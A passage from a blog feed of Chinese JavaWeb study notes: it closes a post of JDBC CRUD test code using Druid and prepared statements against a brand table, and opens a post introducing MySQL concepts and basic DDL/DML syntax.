punctuation">;</span>        <span class="token comment">//6.处理结果</span>        <span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Brand</span><span class="token punctuation">></span></span> brands <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayList</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Brand</span> brand <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span>resultSet<span class="token punctuation">.</span><span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token class-name">Integer</span> id <span class="token operator">=</span> resultSet<span class="token punctuation">.</span><span class="token function">getInt</span><span class="token punctuation">(</span><span class="token string">"id"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">String</span> brandName <span class="token operator">=</span> resultSet<span class="token punctuation">.</span><span class="token function">getString</span><span class="token punctuation">(</span><span class="token string">"brand_name"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">String</span> companyName <span class="token operator">=</span> resultSet<span class="token punctuation">.</span><span class="token function">getString</span><span class="token punctuation">(</span><span class="token string">"company_name"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">Integer</span> ordered <span class="token operator">=</span> resultSet<span class="token punctuation">.</span><span class="token function">getInt</span><span class="token punctuation">(</span><span class="token string">"ordered"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">String</span> description <span class="token operator">=</span> resultSet<span class="token punctuation">.</span><span class="token function">getString</span><span class="token punctuation">(</span><span class="token string">"description"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">Integer</span> status <span class="token operator">=</span> resultSet<span class="token punctuation">.</span><span class="token function">getInt</span><span class="token punctuation">(</span><span class="token string">"status"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            brand <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Brand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            brand<span class="token punctuation">.</span><span class="token function">setId</span><span class="token punctuation">(</span>id<span class="token punctuation">)</span><span class="token punctuation">;</span>            brand<span class="token punctuation">.</span><span class="token function">setBrandName</span><span class="token punctuation">(</span>brandName<span class="token punctuation">)</span><span class="token punctuation">;</span>            brand<span class="token punctuation">.</span><span class="token function">setCompanyName</span><span class="token punctuation">(</span>companyName<span class="token punctuation">)</span><span class="token punctuation">;</span>            brand<span class="token punctuation">.</span><span class="token function">setOrdered</span><span class="token punctuation">(</span>ordered<span class="token punctuation">)</span><span class="token punctuation">;</span>            brand<span class="token punctuation">.</span><span class="token function">setDescription</span><span class="token punctuation">(</span>description<span class="token punctuation">)</span><span class="token punctuation">;</span>            brand<span class="token punctuation">.</span><span class="token function">setStatus</span><span class="token punctuation">(</span>status<span class="token punctuation">)</span><span class="token punctuation">;</span>            brands<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>brand<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token comment">//7.释放资源</span>        resultSet<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        preparedStatement<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        connection<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>brands<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="2-添加数据"><a class="markdownIt-Anchor" href="#2-添加数据">#</a> 2、添加数据</h2><ol><li>编写 SQL 语句</li><li>是否需要参数？需要，除了 ID 之外的所有参数</li><li>返回结果如何封装？boolean</li></ol><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@Test</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">testAdd</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>        <span class="token comment">//接收页面提交的参数</span>        <span class="token class-name">String</span> brandName <span class="token operator">=</span> <span class="token string">"香飘飘"</span><span class="token punctuation">;</span>        <span class="token class-name">String</span> companyName <span class="token operator">=</span> <span class="token string">"香飘飘"</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> ordered <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>        <span class="token class-name">String</span> description <span class="token operator">=</span> <span class="token string">"绕地球一圈"</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> status <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>        <span class="token comment">//1.获取Connection</span>        <span class="token class-name">Properties</span> prop <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Properties</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        prop<span class="token punctuation">.</span><span class="token function">load</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">FileInputStream</span><span class="token punctuation">(</span><span class="token string">"src/druid.properties"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">DataSource</span> dataSource <span class="token operator">=</span> <span class="token class-name">DruidDataSourceFactory</span><span class="token punctuation">.</span><span class="token function">createDataSource</span><span class="token punctuation">(</span>prop<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Connection</span> connection <span class="token operator">=</span> dataSource<span class="token punctuation">.</span><span class="token function">getConnection</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>connection<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">//2.定义SQL语句</span>        <span class="token class-name">String</span> sql <span class="token operator">=</span> <span class="token string">"insert into tb_brand(brand_name,company_name,ordered,description,status) values(?,?,?,?,?)"</span><span class="token punctuation">;</span>        <span class="token comment">//3.获取PreparedStatement对象</span>        <span class="token class-name">PreparedStatement</span> preparedStatement <span class="token operator">=</span> connection<span class="token punctuation">.</span><span class="token function">prepareStatement</span><span class="token punctuation">(</span>sql<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">//4.设置参数</span>        preparedStatement<span class="token punctuation">.</span><span class="token function">setString</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>brandName<span class="token punctuation">)</span><span class="token punctuation">;</span>        preparedStatement<span class="token punctuation">.</span><span class="token function">setString</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span>companyName<span class="token punctuation">)</span><span class="token punctuation">;</span>        preparedStatement<span class="token punctuation">.</span><span class="token function">setInt</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span>ordered<span class="token punctuation">)</span><span class="token punctuation">;</span>        preparedStatement<span class="token punctuation">.</span><span class="token function">setString</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span>description<span class="token punctuation">)</span><span class="token punctuation">;</span>        preparedStatement<span class="token punctuation">.</span><span class="token function">setInt</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span>status<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">//5.执行SQL</span>        <span class="token keyword">int</span> count <span class="token operator">=</span> preparedStatement<span class="token punctuation">.</span><span class="token function">executeUpdate</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">//6.处理结果</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>count <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">//7.释放资源</span>        preparedStatement<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        connection<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="3-根据id修改"><a class="markdownIt-Anchor" href="#3-根据id修改">#</a> 3、根据 ID 修改</h2><ol><li>编写 sql 语句</li><li>是否需要参数？需要：Brand 对象所有数据</li><li>返回结果如何封装？boolean</li></ol><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@Test</span><span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">testUpdate</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>    <span class="token comment">//接收页面提交的参数</span>    <span class="token class-name">String</span> brandName <span class="token operator">=</span> <span class="token string">"香飘飘"</span><span class="token punctuation">;</span>    <span class="token class-name">String</span> companyName <span class="token operator">=</span> <span class="token string">"香飘飘"</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> ordered <span class="token operator">=</span> <span class="token number">1000</span><span class="token punctuation">;</span>    <span class="token class-name">String</span> description <span class="token operator">=</span> <span class="token string">"绕地球三圈"</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> status <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> id <span class="token operator">=</span> <span class="token number">4</span><span class="token punctuation">;</span>    <span class="token comment">//1.获取Connection</span>    <span class="token class-name">Properties</span> prop <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Properties</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    prop<span class="token punctuation">.</span><span class="token function">load</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">FileInputStream</span><span class="token punctuation">(</span><span class="token string">"src/druid.properties"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">DataSource</span> dataSource <span class="token operator">=</span> <span class="token class-name">DruidDataSourceFactory</span><span class="token punctuation">.</span><span class="token function">createDataSource</span><span class="token punctuation">(</span>prop<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">Connection</span> connection <span class="token operator">=</span> dataSource<span class="token punctuation">.</span><span class="token function">getConnection</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>connection<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//2.定义SQL语句</span>    <span class="token class-name">String</span> sql <span class="token operator">=</span> <span class="token string">"update tb_brand set brand_name=?,company_name=?,ordered=?,description=?,status=? where id=?;"</span><span class="token punctuation">;</span>    <span class="token comment">//3.获取PreparedStatement对象</span>    <span class="token class-name">PreparedStatement</span> preparedStatement <span class="token operator">=</span> connection<span class="token punctuation">.</span><span class="token function">prepareStatement</span><span class="token punctuation">(</span>sql<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//4.设置参数</span>    preparedStatement<span class="token punctuation">.</span><span class="token function">setString</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>brandName<span class="token punctuation">)</span><span class="token punctuation">;</span>    preparedStatement<span class="token punctuation">.</span><span class="token function">setString</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span>companyName<span class="token punctuation">)</span><span class="token punctuation">;</span>    preparedStatement<span class="token punctuation">.</span><span class="token function">setInt</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span>ordered<span class="token punctuation">)</span><span class="token punctuation">;</span>    preparedStatement<span class="token punctuation">.</span><span class="token function">setString</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span>description<span class="token punctuation">)</span><span class="token punctuation">;</span>    preparedStatement<span class="token punctuation">.</span><span class="token function">setInt</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span>status<span class="token punctuation">)</span><span class="token punctuation">;</span>    preparedStatement<span class="token punctuation">.</span><span class="token function">setInt</span><span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">,</span>id<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//5.执行SQL</span>    <span class="token keyword">int</span> count <span class="token operator">=</span> preparedStatement<span class="token punctuation">.</span><span class="token function">executeUpdate</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//6.处理结果</span>    <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>count <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//7.释放资源</span>    preparedStatement<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    connection<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="4-根据id修改"><a class="markdownIt-Anchor" href="#4-根据id修改">#</a> 4、根据 ID 修改</h2><ol><li>编写 SQL 语句</li><li>是否需要参数？需要，id</li><li>返回结果如何处理？boolean</li></ol><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@Test</span><span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">testDelete</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>    <span class="token class-name">Properties</span> prop <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Properties</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    prop<span class="token punctuation">.</span><span class="token function">load</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">FileInputStream</span><span class="token punctuation">(</span><span class="token string">"src/druid.properties"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">DataSource</span> dataSource <span class="token operator">=</span> <span class="token class-name">DruidDataSourceFactory</span><span class="token punctuation">.</span><span class="token function">createDataSource</span><span class="token punctuation">(</span>prop<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">Connection</span> connection <span class="token operator">=</span> dataSource<span class="token punctuation">.</span><span class="token function">getConnection</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">String</span> sql <span class="token operator">=</span> <span class="token string">"delete from tb_brand where id=?;"</span><span class="token punctuation">;</span>    <span class="token class-name">PreparedStatement</span> preparedStatement <span class="token operator">=</span> connection<span class="token punctuation">.</span><span class="token function">prepareStatement</span><span class="token punctuation">(</span>sql<span class="token punctuation">)</span><span class="token punctuation">;</span>    preparedStatement<span class="token punctuation">.</span><span class="token function">setInt</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> i <span class="token operator">=</span> preparedStatement<span class="token punctuation">.</span><span class="token function">executeUpdate</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>i <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    preparedStatement<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    connection<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;1-jdbc简介&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#1-jdbc简介&quot;&gt;#&lt;/a&gt; 1、JDBC 简介&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;JDBC 概念&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;JDBC 就是使用 Java 语言操作关系</summary>
      
    
    
    
    <category term="JavaWeb" scheme="http://example.com/categories/JavaWeb/"/>
    
    
    <category term="JavaWeb" scheme="http://example.com/tags/JavaWeb/"/>
    
  </entry>
  
  <entry>
    <title>JavaWeb-数据库</title>
    <link href="http://example.com/post/JavaWeb-%E6%95%B0%E6%8D%AE%E5%BA%93.html"/>
    <id>http://example.com/post/JavaWeb-%E6%95%B0%E6%8D%AE%E5%BA%93.html</id>
    <published>2022-06-20T15:09:13.000Z</published>
    <updated>2022-06-22T06:02:08.921Z</updated>
    
    <content type="html"><![CDATA[<p>JavaWeb - 数据库</p><h1 id="1-数据库的相关概念"><a class="markdownIt-Anchor" href="#1-数据库的相关概念">#</a> 1、数据库的相关概念</h1><ul><li>数据库</li><li>数据库管理系统</li><li>SQL</li><li>常见的关系型数据库管理系统</li></ul><p>数据库：</p><ul><li>存储数据的仓库，数据是有组织进行存储</li><li>英文：DataBase，简称 DB</li></ul><p>数据库管理系统：</p><ul><li>管理数据库的大型软件</li><li>英文：DataBase Management System，简称 DBMS</li></ul><p>SQL：</p><ul><li>英文：Structured Query Language，简称 SQL，结构化查询语言</li><li>操作关系型数据库的语言</li><li>定义操作所有关系型数据库的统一标准</li><li>每一种数据库的操作方式存在不一样的地方，称为 “方言”</li></ul><p>常见的关系型数据库管理系统：</p><ul><li>Oracle：收费，且非常昂贵，金融银行使用 Oracle 的居多</li><li>MySQL：开源的免费的中小型数据库，在互联网公司使用的非常多</li><li>SQL Server：微软的收费数据库，在 Java 中使用的不多</li><li>PostgreSQL：开源中小型数据库</li><li>DB2：IBM 公司的大型收费数据库产品</li><li>SQLite：嵌入式的微型数据库，如：作为 Android 内置数据库</li><li>MariaDB：开源免费中小型数据库</li></ul><blockquote><span class="custom-blockquote-svg"><svg width="24" height="24" viewBox="0 0 24 24" fill="" xmlns="http://www.w3.org/2000/svg" data-reactroot=""><path fill="" d="M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z" undefined="1"></path><path fill="" d="M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z" undefined="1"></path><path fill="" d="M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z" undefined="1"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z"></path></svg></span><p>本次只学习 MySQL，对于后续的其他数据库，都是使用 SQL 操作的，而且 SQL 可以操作市面上所有的关系型数据库</p></blockquote><h1 id="2-mysql数据库"><a class="markdownIt-Anchor" href="#2-mysql数据库">#</a> 2、MySQL 数据库</h1><ul><li>MySQL 安装</li><li>MySQL 卸载</li><li>MySQL 配置</li><li>MySQL 登录、退出</li></ul><p>安装、登录、卸载、配置等参见安装手册</p><ul><li>MySQL 数据模型</li></ul><p>MySQL 数据库模型：</p><ul><li>关系型数据库<ul><li>关系型数据库是建立在关系模型基础上的数据库，简单说，关系型数据库是由多张能够相互连接的二维表组成的数据库</li><li>优点：<ol><li>都是使用表结构，格式一致，易于维护</li><li>使用通用的 SQL 语言操作，使用方便，可用于复杂查询</li><li>数据存储在磁盘中，安全（存在硬盘中就是<strong>持久化存储</strong>）</li></ol></li></ul></li><li>不通过表存取的就是非关系型数据库</li><li>数据库是通过文件夹实现的，MySQL 的数据存放在<strong> data</strong> 目录下，每个文件夹对应一个数据库</li></ul><h1 id="3-sql通用语法"><a class="markdownIt-Anchor" href="#3-sql通用语法">#</a> 3、SQL 通用语法</h1><ol><li>SQL 语句可以以单行或多行书写，以分号结尾</li><li>可以使用空格或制表符来提高可读性</li><li>MySQL 数据库的 SQL 语句不区分大小写，但是关键字<strong>建议以大写来表示</strong></li><li>3 种注释：<ul><li>单行注释：<strong>– 注释内容</strong>  或 <strong>#注释内容</strong></li><li>多行注释：/* 注释内容 */</li></ul></li></ol><h1 id="4-sql分类"><a class="markdownIt-Anchor" href="#4-sql分类">#</a> 4、SQL 分类</h1><p>SQL 语句根据其功能，主要分为四类：DDL、DML、DQL、DCL。 DDL：</p><p>DDL：Data Definition Language 数据定义语言，用来定义数据库对象 (数据库，表， 字段)</p><p>DML：Data Manipulation Language 数据操作语言，用来对数据库表中的数据进行<strong>增删改</strong></p><p>DQL： Data Query Language 数据查询语言，用来<strong>查询</strong>数据库中表的记录</p><p>DCL： Data Control Language 数据控制语言，用来创建数据库用户、控制数据库的<strong>访问权限</strong></p><p><img src="http://wuriteup.oss-cn-qingdao.aliyuncs.com/img/image-20220620221541057.png" alt="image-20220620221541057"></p><h1 id="5-ddl操作数据库-表"><a class="markdownIt-Anchor" href="#5-ddl操作数据库-表">#</a> 5、DDL：操作数据库、表</h1><h2 id="51-操作数据库crud"><a class="markdownIt-Anchor" href="#51-操作数据库crud">#</a> 5.1 操作数据库：CRUD</h2><ol><li><p>C (Create)：创建</p><ul><li><p>创建数据库：<strong>create database 数据库名称；</strong></p></li><li><p>创建数据库，判断是否存在，不存在再创建：<strong>create database if not exists 数据库名称；</strong></p></li><li><p>创建数据库，并指定字符集：<strong>create database 数据库名称 character set 字符集名；</strong></p></li><li><p>创建一个 db4 的数据库，判断是否存在，并指定字符集为 gbk：<strong>create database if not exists db4 character set gbk;</strong></p></li></ul></li><li><p>R (Retrieve)：查询</p><ul><li>查询所有数据库的名称：<strong>show databases;</strong></li><li>查询创建数据库的 SQL 语句、字符集：<strong>show create database 数据库名；</strong></li></ul></li><li><p>U (Update)：修改</p><ul><li>修改数据库的字符集：<strong>alter database 数据库名称 character set 字符集名；</strong></li></ul></li><li><p>D (Delete)：删除</p><ul><li>删除数据库：<strong>drop database 数据库名称；</strong></li><li>判断数据库是否存在，存在再删除：<strong>drop database if exists 数据库名称；</strong></li></ul></li><li><p>使用数据库</p><ul><li>查询当前正在使用的数据库名称：<strong>select database();</strong></li><li>使用数据库：<strong>use 数据库名称；</strong></li></ul></li></ol><h2 id="52-操作表crud"><a class="markdownIt-Anchor" href="#52-操作表crud">#</a> 5.2 操作表：CRUD</h2><ol><li><p>C (Create)：创建</p><ul><li><p>语法：create table 表名 (</p><p>列明 1 数据类型 1,</p><p>列名 2 数据类型 2,</p><p>…</p><p>列明 n 数据类型 n</p><p>);# 注意最后一列不需要加逗号</p></li><li><p>数据类型</p><ul><li>int：整数类型<ul><li>age int,</li></ul></li><li>double：小数类型<ul><li>score double (5,2)_最多有 5 位，小数点后 2 位</li></ul></li><li>date：日期，只包含年月日，yyyy-MM-dd</li><li>datetime：日期，包含年月日时分秒，yyyy-MM-dd HH:mm:ss</li><li>timestamp：时间戳类型，包含年月日时分秒，如果将来不给这个字段赋值或赋值为 null，则默认使用当前的系统时间来<strong>自动赋值</strong></li><li>varchar：字符串<ul><li>name varchar (20)：姓名最大 20 个字符</li></ul></li></ul></li><li><p>复制一张表，如复制一张 student 为 student1：<strong>create table student1 like student;</strong></p></li><li><p>创建一张学生表</p></li></ul><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">mysql<span class="token operator">></span> <span class="token keyword">create</span> <span class="token keyword">table</span> student<span class="token punctuation">(</span>    <span class="token operator">-</span><span class="token operator">></span> id <span class="token keyword">int</span><span class="token punctuation">,</span>    <span class="token operator">-</span><span class="token operator">></span> name <span class="token keyword">varchar</span><span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token operator">-</span><span class="token operator">></span> age <span class="token keyword">int</span><span class="token punctuation">,</span>    <span class="token operator">-</span><span class="token operator">></span> score <span class="token keyword">double</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token operator">-</span><span class="token operator">></span> birthday <span class="token keyword">date</span><span class="token punctuation">,</span>    <span class="token operator">-</span><span class="token operator">></span> insert_time <span class="token keyword">timestamp</span>    <span class="token operator">-</span><span class="token operator">></span> <span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>R (Retrieve)：查询</p><ul><li>查询某个数据库中所有表的名称：<strong>show tables;</strong></li><li>查询表结构：<strong>desc 表名称；</strong></li><li>查询表的创建语句：<strong>show create table 表名；</strong></li></ul></li><li><p>U (Update)：修改</p><ul><li>修改表名：<strong>alter table 表名 rename to 新表名；</strong></li><li>修改表的字符集：<strong>show create table 表名；alter table 表名 character set 新字符集名；</strong></li><li>添加一列：<strong>alter table 表名 add 列名 数据类型；</strong></li><li>修改列名称、类型：<strong>alter table 表名 change 旧列名 新列明 新数据类型；<strong> 或</strong> alter table 表名 modify 列名 新数据类型；</strong></li><li>删除列：<strong>alter table 表名 drop 列名；</strong></li></ul></li><li><p>D (Delete)：删除</p><ul><li>删除表：<strong>drop table 表名；</strong></li><li>如果存在，再删除：<strong>drop table if exists 表名；</strong></li></ul></li></ol><p><img src="http://wuriteup.oss-cn-qingdao.aliyuncs.com/img/image-20220620224922952.png" alt="image-20220620224922952"></p><h1 id="6-dml增删改表中数据"><a class="markdownIt-Anchor" href="#6-dml增删改表中数据">#</a> 6、DML：增删改表中数据</h1><h2 id="51-添加数据"><a class="markdownIt-Anchor" href="#51-添加数据">#</a> 5.1 添加数据</h2><ul><li>基本语法：<strong>insert into 表名 (列名 1, 列明 2,…, 列明 n) values (值 1, 值 2, 值 3,…, 值 n)</strong></li><li>注意：<ol><li>列明和值要<strong>一一对应</strong></li><li>如果表名后不定义列明，则默认给所有列添加值</li><li>除了数字类型，其他类型需要使用引号 (单双引号都可以) 引起来</li></ol></li></ul><h2 id="52-删除数据"><a class="markdownIt-Anchor" href="#52-删除数据">#</a> 5.2 删除数据</h2><ul><li>基本语法：delete from 表名 [where 条件];<ul><li>删除 id 为 2 的值：delete from stu where id = 2;</li></ul></li><li>注意：<ol><li>如果不加条件，则<strong>删除表中所有记录</strong>，非常危险不要使用</li><li>如果要删除所有记录，两种方法：<ol><li>delete from 表名；-- 不推荐使用，因为有多少条记录就执行多少次指令，效率很低</li><li>**truncate table 表名；** 先删除表，再创建一个和原表一样的空表，推荐使用，效率更高</li></ol></li></ol></li></ul><h2 id="53-修改数据"><a class="markdownIt-Anchor" href="#53-修改数据">#</a> 5.3 